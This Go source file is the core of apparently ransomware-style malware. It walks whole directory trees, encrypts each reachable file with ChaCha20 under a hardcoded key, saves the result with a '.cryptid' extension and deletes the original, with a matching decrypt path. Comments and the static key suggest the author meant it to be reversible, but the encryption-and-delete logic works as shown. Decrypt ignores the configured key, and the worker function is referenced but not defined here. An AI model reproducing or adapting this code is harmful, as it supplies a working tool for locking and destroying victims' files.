package main

import (
	"crypto/cipher"
	"io"
	"io/fs"
	"log"
	"os"
	"path/filepath"
	"strings"
	"sync"

	"golang.org/x/crypto/chacha20"
)

// don't want to irreperably encrypt anything
// do not want to encrypt system files, etc...
var (
	StaticKey          = []byte(`supersecurekeyimpossibletoguess!`)
	StaticNonce        = make([]byte, chacha20.NonceSize)
	ExcludePaths       = []string{"C:\\Windows\\System32"}
	EncryptedExtension = ".cryptid"
)

type Cryptor struct {
	Key                    []byte
	EncryptionChan         chan string
	JobChan                chan string
	ErrChan                chan error
	Done                   chan struct{}
	WorkerCount            int
	EncryptingOrDecrypting CryptorState
}

func NewCryptor(options ...Option) *Cryptor {
	var wc = 5
	c := &Cryptor{
		Key:                    StaticKey,
		EncryptionChan:         make(chan string),
		JobChan:                make(chan string, wc),
		ErrChan:                make(chan error),
		Done:                   make(chan struct{}),
		WorkerCount:            wc,
		EncryptingOrDecrypting: Decrypting,
	}

	for _, opt := range options {
		opt(c)
	}

	return c
}

type Option func(*Cryptor)

func withWorkerCount(workerCount int) Option {
	return func(c *Cryptor) {
		c.JobChan = make(chan string, workerCount)
		c.WorkerCount = workerCount
	}
}

func withEncryption(b bool) Option {
	return func(c *Cryptor) {
		if b {
			c.EncryptingOrDecrypting = Encrypting
			return
		}
		c.EncryptingOrDecrypting = Decrypting
	}
}

func (c *Cryptor) Enumerate(p string, d fs.DirEntry, err error) error {
	if err != nil {
		// do not want to encrypt files requiring escalated priveleges
		if os.IsPermission(err) {
			return nil
		}
		return err
	}

	for _, excluded := range ExcludePaths {
		if strings.HasPrefix(p, excluded) {
			return filepath.SkipDir
		}
	}

	if !d.IsDir() {
		c.EncryptionChan <- p
	}

	return nil
}

func (c *Cryptor) EnumerateDirectories(dirs []string) {
	var wg sync.WaitGroup

	wg.Add(len(dirs))
	for _, d := range dirs {
		go func() {
			defer wg.Done()
			c.ErrChan <- filepath.WalkDir(d, c.Enumerate)
		}()
	}

	go func() {
		wg.Wait()
		c.Done <- struct{}{}
	}()
}

func (c *Cryptor) CryptFunc(path string, f func(target io.Reader, outfile string) error) error {
	target, err := os.Open(path)
	if err != nil {
		return err
	}
	defer target.Close()

	outpath := path + EncryptedExtension
	if c.EncryptingOrDecrypting == Decrypting {
		outpath = strings.TrimSuffix(path, EncryptedExtension)
	}

	if err := f(target, outpath); err != nil {
		return err
	}

	target.Close()
	return os.Remove(path)
}

// TODO: write some tests
func (c *Cryptor) Encrypt(target io.Reader, outfile string) error {
	out, err := os.Create(outfile)
	if err != nil {
		return err
	}
	defer out.Close()

	realSmooth, err := chacha20.NewUnauthenticatedCipher(c.Key, StaticNonce)
	if err != nil {
		return err
	}

	writer := cipher.StreamWriter{
		S: realSmooth,
		W: out,
	}

	_, err = io.Copy(writer, target)
	return err
}

// TODO: write some tests
func (c *Cryptor) Decrypt(target io.Reader, outfile string) error {
	out, err := os.Create(outfile)
	if err != nil {
		return err
	}
	defer out.Close()

	lessSmooth, err := chacha20.NewUnauthenticatedCipher(StaticKey, StaticNonce)
	if err != nil {
		panic(err)
	}

	writer := cipher.StreamWriter{
		S: lessSmooth,
		W: out,
	}

	_, err = io.Copy(writer, target)
	return err
}

func (c *Cryptor) ListenAndManageEncryption() error {
	var wg sync.WaitGroup

	wg.Add(c.WorkerCount)
	for range c.WorkerCount {
		go c.NewWorker(&wg)
	}

	for {
		select {
		case path := <-c.EncryptionChan:
			c.JobChan <- path
		case err := <-c.ErrChan:
			switch err {
			case nil:
				// do nothing
			default:
				log.Println(err)
			}
		case <-c.Done:
			close(c.JobChan)
			wg.Wait()
			return nil
		}
	}
}

type CryptorState int

const (
	Encrypting CryptorState = iota
	Decrypting
)

func (c CryptorState) String() string {
	if c == Encrypting {
		return "encrypting"
	}

	return "decrypting"
}
